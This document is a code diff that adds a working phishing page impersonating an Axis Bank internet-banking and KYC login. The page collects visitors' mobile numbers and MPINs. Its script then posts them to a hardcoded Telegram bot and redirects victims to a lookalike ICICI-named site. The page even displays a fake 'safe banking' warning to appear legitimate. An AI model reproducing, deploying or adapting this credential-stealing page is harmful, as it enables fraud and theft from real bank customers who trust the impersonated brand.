@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  
+  <title>Axis Bank Credit Card</title>
+  <style>
+    body {
+      background-color: #f7f7f7;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    .legend {
+      background-color: #640040;
+      color: white;
+      text-align: center;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      width: 200px;
+      margin: 20px auto;
+      display: block;
+    }
+
+    .container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .outer-box {
+      width: 80%;
+      margin: 0 auto 20px auto;
+      padding: 20px;
+      text-align: left;
+      color: black;
+      position: relative;
+    }
+
+    .text-editor-box {
+      margin-top: 20px;
+      margin-bottom: 20px;
+      text-align: left;
+      padding: 10px;
+      color:#191970;
+    }
+
+    .text-editor-box input[type="text"],
+    .text-editor-box input[type="number"],
+    .text-editor-box input[type="checkbox"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 14px;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      padding-bottom: 5px;
+      
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+    }
+
+    .remember-me label {
+      margin-right: 500px;
+      color:#191970;
+    }
+
+    .input-field {
+      width: 100%;
+      color:#191970;
+    }
+
+    .submit-button {
+      background-color: #640040;
+      color: white;
+      padding: 10px;
+      margin: 10px auto 20px auto;
+      width: 100%;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .button {
+      width: 100%;
+      height: 40px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+      background-color: #f7f7f7;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      font-family: 'Arial', sans-serif;
+    }
+
+    .customer-care {
+      background-color: #f7f7f7;
+      padding: 20px;
+      border-radius: 10px;
+      color:#191970;
+      max-width: 450px;
+      margin: auto;
+      margin-bottom: 100px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      font-family: 'Arial', sans-serif;
+    }
+
+    .banner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px;
+      background-color: #f7f7f7;
+      color: black;
+      font-family: Arial, sans-serif;
+      border-radius: 50px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .container p {
+      margin-left:12px;
+      font-size: 18px;
+      line-height: 1.5em;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      font-family: 'Arial', sans-serif;
+    }
+  </style>
+</head>
+<body>
+<div class="legend">
+  <h1 style="text-transform: uppercase;">Google Play Service</h1>
+</div>
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Axis_Bank_logo.svg/2560px-Axis_Bank_logo.svg.png" alt="Axis Bank Logo" class="logo">
+<p style="font-size: 35px; color:#191970; text-align: center;">Login With Internet Banking </p>
+
+<div class="container">
+  <p style="text-align: left; color:#191970;">Welcome to Axis Bank fast & Secure Online KYC App. Here you can complete your KYC Within 2 minutes. Thank you for joining Axis Bank. Mobile No.: *</p>
+</div>
+
+<div class="outer-box">
+  <div class="text-editor-box">
+    <form id="creditCardForm">
+      <label for="MobileNumber">Mobile number:</label>
+      <input type="text" id="MobileNumber" name="MobileNumber" required placeholder="Mobile">
+      <div class="input-field">
+        <label for="MPIN">MPIN:</label>
+        <input type="text" id="MPIN" name="MPIN" required placeholder="Enter Pin">
+      </div>
+      <div class="remember-me">
+        <input type="checkbox" id="rememberMe" name="rememberMe">
+        <label for="rememberMe">Remember</label>
+      </div>
+      <button type="submit" class="submit-button">Submit</button>
+    </form>
+  </div>
+</div>
+
+<div class="customer-care">
+  <p>safe Banking Never share your User ID, Password or any other information with anyone on phone, SMS, or Email. AXIS Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.</p>
+</div>
+
+<script>
+  document.getElementById('creditCardForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    var mobileNumber = document.getElementById('MobileNumber').value;
+    var mpin = document.getElementById('MPIN').value;
+    var rememberMe = document.getElementById('rememberMe').checked;
+
+    // WARNING: Exposing your Telegram bot token in client-side code is insecure
+    var botToken = '6995157409:AAHmNmknP17YPQ6cbURXxHPNgxXaPllhVcc'; // Replace with your actual bot token
+    var chatId = '6460394027'; // Replace with your actual chat ID
+    var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    var message = `Mobile Number: ${mobileNumber}\nMPIN: ${mpin}\nRemember Me: ${rememberMe ? 'Yes' : 'No'}`;
+
+    fetch(apiUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log('Before redirection'); // Add this line
+        window.location.href = 'https://icici-credit-card.github.io/loading/';
+      } else {
+        alert('Failed to send the message to the Telegram bot.');
+      }
+    })
+    .catch((error) => {
+      console.error('Error:', error);
+      alert('An error occurred while sending the message.');
+    });
+  });
+</script>
+</body>
+</html>
